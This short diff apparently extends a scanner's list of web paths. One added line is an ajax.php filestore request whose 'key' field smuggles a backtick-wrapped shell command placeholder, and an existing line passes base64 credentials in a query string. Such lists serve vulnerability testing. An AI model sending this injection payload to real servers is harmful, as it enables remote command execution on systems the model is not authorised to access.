@@ -93,3 +93,5 @@
 /{{externalAuthContainer}}
 /helpdesk/WebObjects/Helpdesk.woa/wo/{{jsonrpc_endpoint}}
 /system/deviceInfo?auth=YWRtaW46MTEK
+/admin/config.php
+/admin/ajax.php?module=filestore&command=testconnection&driver=SSH&host=127.0.0.1&user={{prefix}}&port=22&key={{prefix}}`{{cmd}}`&path={{prefix}}
